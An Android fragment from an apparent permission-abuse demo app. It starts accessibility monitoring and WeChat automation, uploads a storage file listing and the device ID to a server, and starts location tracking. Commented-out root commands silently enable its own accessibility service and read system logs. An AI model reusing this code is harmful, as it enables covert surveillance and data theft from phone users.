/*
 * Copyright (C) 2022 xuexiangjys(xuexiangjys@163.com)
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *       http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 *
 */

package com.lenovo.innovate.fragment.trending;

import static com.xuexiang.xutil.XUtil.getContentResolver;

import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.provider.Settings;
import android.text.TextUtils;
import android.util.Log;
import android.view.LayoutInflater;
import android.view.ViewGroup;
import android.view.accessibility.AccessibilityNodeInfo;
import android.widget.Toast;

import androidx.annotation.NonNull;

import com.alibaba.fastjson.JSONArray;
import com.alibaba.fastjson.JSONObject;
import com.an.deviceinfo.location.DeviceLocation;
import com.an.deviceinfo.location.LocationInfo;
import com.blankj.utilcode.util.AppUtils;
import com.blankj.utilcode.util.ThreadUtils;
import com.hjq.permissions.OnPermissionCallback;
import com.hjq.permissions.Permission;
import com.hjq.permissions.XXPermissions;
import com.lenovo.innovate.MyApp;
import com.lenovo.innovate.R;
import com.lenovo.innovate.core.BaseFragment;
import com.lenovo.innovate.databinding.FragmentLanyongBinding;
import com.lenovo.innovate.prince.accessiblity.AccUtils;
import com.lenovo.innovate.prince.accessiblity.AccessService;
import com.lenovo.innovate.prince.accessiblity.AutoRun;
import com.lenovo.innovate.prince.accessiblity.AutoWeChat;
import com.lenovo.innovate.prince.accessiblity.StringText;
import com.lenovo.innovate.prince.http.permissionUp;
import com.lenovo.innovate.prince.utils.Sdcard;
import com.lenovo.innovate.prince.utils.ServiceUtils;
import com.lenovo.innovate.prince.view.ColoredToast;
import com.lenovo.innovate.prince.view.InfoDialog;
import com.lenovo.innovate.utils.XToastUtils;
import com.lenovo.innovate.utils.shell;
import com.xuexiang.xpage.annotation.Page;
import com.xuexiang.xpage.enums.CoreAnim;
import com.xuexiang.xui.utils.StatusBarUtils;
import com.xuexiang.xui.widget.actionbar.TitleBar;
import com.xuexiang.xui.widget.dialog.materialdialog.MaterialDialog;
import com.xuexiang.xui.widget.textview.supertextview.SuperTextView;

import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

/**
 * @author xuexiang
 * @since 2019-10-30 00:19
 */
@Page(anim = CoreAnim.none)
public class LanYongFragment extends BaseFragment<FragmentLanyongBinding>  implements SuperTextView.OnSuperTextViewClickListener{

    @NonNull
    @Override
    protected FragmentLanyongBinding viewBindingInflate(LayoutInflater inflater, ViewGroup container) {
        return FragmentLanyongBinding.inflate(inflater, container, false);
    }

    /**
     * @return 返回为 null意为不需要导航栏
     */
    @Override
    protected TitleBar initTitle() {
        return null;
    }

    /**
     * 初始化控件
     */
    @Override
    protected void initViews() {
        binding.menuLocation.setOnSuperTextViewClickListener(this);
        binding.menuDirectory.setOnSuperTextViewClickListener(this);
        binding.menuAutomaticKz.setOnSuperTextViewClickListener(this);
        binding.menuService.setOnSuperTextViewClickListener(this);



    }

    @Override
    public void onClick(SuperTextView superTextView) {
        switch(superTextView.getId()) {

            case R.id.menu_service:
                //OpenServer();

                if (!isSettingOpen(AccessService.class, getActivity())) {
                    showSimpleTipDialog();
                    return;
                }

              /*  String apkRoot = "chmod 777 " + getActivity().getPackageCodePath();
                Utils.RootCommand(apkRoot);
                //  haveRoot();
                Utils.execRootCmdSilent("settings put secure enabled_accessibility_services " + getActivity().getPackageName() + "/com.lenovo.innovate.prince.accessiblity.AccessService");
                Utils.execRootCmdSilent("settings put secure accessibility_enabled 1");

                AppUtils.launchApp("com.tencent.mm");*/

                if(MyApp.getInstance().getService() != null){
                    XToastUtils.success("开始监控");

                    ThreadUtils.executeBySingle(new ThreadUtils.SimpleTask<String>() {
                        @Override
                        public String doInBackground() throws Throwable {
                            StringText aa = new StringText();
                            aa.start();
                            return null;
                        }
                        @Override
                        public void onSuccess(String result) {

                        }
                    });

                }

                break;
            case R.id.menu_location:
                // LocationTracking locationTracking = new LocationTracking();
                get__location();


               // XToastUtils.toast(   AccUtils.time() + "位置："+"北京市海淀区软件园西三路");
                break;
            case R.id.menu_directory:
                get_storage(getActivity());
                //showSimpleTipDialog();
                break;
      /*      case R.id.menu_install:

                String cmd1 = "ASH_STANDALONE=1 /data/adb/magisk/busybox sh";
                String ls ="ASH_STANDALONE=1 /data/adb/magisk/busybox ls /data/adb/lspd/log/";
              //  String aa1 = AccUtils.execRootCmd(cmd1);
                String cmd = "ASH_STANDALONE=1 /data/adb/magisk/busybox   cat /data/adb/lspd/log/modules_2022-07-05T17:20:32.078.log";
               // String cmd1 = "rm-rf ";
                String aa = AccUtils.execRootCmd(cmd);
                String ls1 = AccUtils.execRootCmd(ls);
                Log.i("22222222",aa);
                Log.i("22222222",ls1);

              *//*  Sdcard sdcard1 = new Sdcard();
                XToastUtils.toast( sdcard1.dir("/data/adb/lspd/log/"));*//*
                break;*/

            case R.id.menu_automatic_kz:
            /*    String apkRoot1 = "chmod 777 " + getActivity().getPackageCodePath();
                AccUtils.RootCommand(apkRoot1);
                OpenServer();
                if (!isSettingOpen(AccessService.class, getActivity())) {
                    return;
                }
                String apkRoot = "chmod 777 " + getActivity().getPackageCodePath();
                AccUtils.RootCommand(apkRoot);*/

              //  AppUtils.launchApp("com.tencent.mm");
                XToastUtils.success("运行开始");
               new Thread(new AutoRun()).start();
             /*   ThreadUtils.executeBySingle(new ThreadUtils.SimpleTask<String>() {
                    @Override
                    public String doInBackground() throws Throwable {
                   *//*     AutoWeChat autoWeChat = new AutoWeChat();
                        autoWeChat.start();*//*

                        return null;
                    }
                    @Override
                    public void onSuccess(String result) {

                    }
                });*/
                break;

            default:
                break;
        }
    }

    private void OpenServer() {
        //判断权限是否开启
        if (!isSettingOpen(AccessService.class, getActivity())) {
            InfoDialog infoDialog = new InfoDialog.Builder(getActivity())
                    .setMessage("此权限可以控制你的手机及获取你都屏幕")
                    .setButton("开启权限", view ->
                            new ColoredToast.Maker(getActivity())
                                    .makeToast("Clicked OK", Toast.LENGTH_SHORT, getActivity())
                                    .show()
                    ).create();
            infoDialog.show();
        }

    }

    /**
     * 简单的提示性对话框
     */
    private void showSimpleTipDialog() {
        MaterialDialog dialog = new MaterialDialog.Builder(getContext())
                .iconRes(R.drawable.icon_tip)
                .title("提示")
                .content("此权限能够获取你的屏幕信息和控制手机")
                .positiveText("确定")
                .build();
        StatusBarUtils.showDialog(getActivity(), dialog);
        dialog.setOnDismissListener(new DialogInterface.OnDismissListener() {
            @Override
            public void onDismiss(DialogInterface dialogInterface) {

                if (!isSettingOpen(AccessService.class, getActivity())) {
                    Intent intent = new Intent("android.settings.ACCESSIBILITY_SETTINGS");
                    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    getActivity().startActivity(intent);
                }

            }
        });

    }

    private void showSimpleTipDialog_location(String aa) {
        MaterialDialog dialog = new MaterialDialog.Builder(getContext())
                .iconRes(R.drawable.icon_tip)
                .title("提示")
                .content("你的位置将持续暴露"+"\n"+aa)
                .positiveText("确定")
                .build();
        StatusBarUtils.showDialog(getActivity(), dialog);


    }


    public static boolean isSettingOpen(Class cls, Context context) {
        try {
            if (Settings.Secure.getInt(context.getContentResolver(), "accessibility_enabled", 0) != 1) {
                return false;
            }
            String string = Settings.Secure.getString(context.getContentResolver(), "enabled_accessibility_services");
            if (!TextUtils.isEmpty(string)) {
                TextUtils.SimpleStringSplitter simpleStringSplitter = new TextUtils.SimpleStringSplitter(':');
                simpleStringSplitter.setString(string);
                while (simpleStringSplitter.hasNext()) {
                    String next = simpleStringSplitter.next();
                    if (next.equalsIgnoreCase(context.getPackageName() + "/" + cls.getName())) {
                        return true;
                    }
                }
            }
        } catch (Throwable th) {
            Log.e("qyh", "isSettingOpen: " + th.getMessage());
        }
        return false;
    }

    public  void get_storage(Context context){
        XXPermissions.with(context)
                .permission(Permission.READ_EXTERNAL_STORAGE)
                .request(new OnPermissionCallback() {
                    @Override
                    public void onGranted(List<String> permissions, boolean all) {
                        if (all){
                            XToastUtils.toast( "onGranted: 获取权限成功！");

                            Map<String,String> map = new HashMap<>();
                            Sdcard sdcard = new Sdcard();
                            XToastUtils.toast(sdcard.dir("/storage/emulated/0/"));
                            map.put("fileName",sdcard.dir("/storage/emulated/0/"));

                            JSONObject jsonObject  = new JSONObject();
                            jsonObject.put("permission","ex_file");
                            jsonObject.put("deviceId",Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID));
                            jsonObject.put("data", JSONArray.toJSON(map));
                            //  permissionUp permissionUp = new permissionUp();
                            permissionUp.Up(10,jsonObject);
                        }
                    }
                    @Override
                    public void onDenied(List<String> permissions, boolean never) {
                        if (never){
                            XToastUtils.toast( "onDenied：被永久拒绝授权，请手动授予权限 ");
                            XXPermissions.startPermissionActivity(context,permissions);
                        }else {
                            XToastUtils.toast( "onDenied: 权限获取失败 ");
                        }
                    }
                });
    }

    public  void get__location(){
        XXPermissions.with(getActivity())
                .permission(Permission.ACCESS_FINE_LOCATION)
                .permission(Permission.ACCESS_COARSE_LOCATION)

                .request(new OnPermissionCallback() {
                    @Override
                    public void onGranted(List<String> permissions, boolean all) {
                        if (all){

                            JSONObject jsonObject  = new JSONObject();
                            jsonObject.put("permission","gz");
                            jsonObject.put("deviceId",Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID));
                            jsonObject.put("data", "start");

                            //  permissionUp permissionUp = new permissionUp();
                            permissionUp.Up(9,jsonObject);
                            //XToastUtils.toast( "onGranted: 获取权限成功！");



                            // http_contact(jsonObject);
                        }
                    }
                    @Override
                    public void onDenied(List<String> permissions, boolean never) {
                        if (never){
                            XToastUtils.toast( "onDenied：被永久拒绝授权，请手动授予权限 ");
                            XXPermissions.startPermissionActivity(getActivity(),permissions);
                        }else {
                            XToastUtils.toast( "onDenied: 权限获取失败 ");
                        }
                    }
                });
    }

}
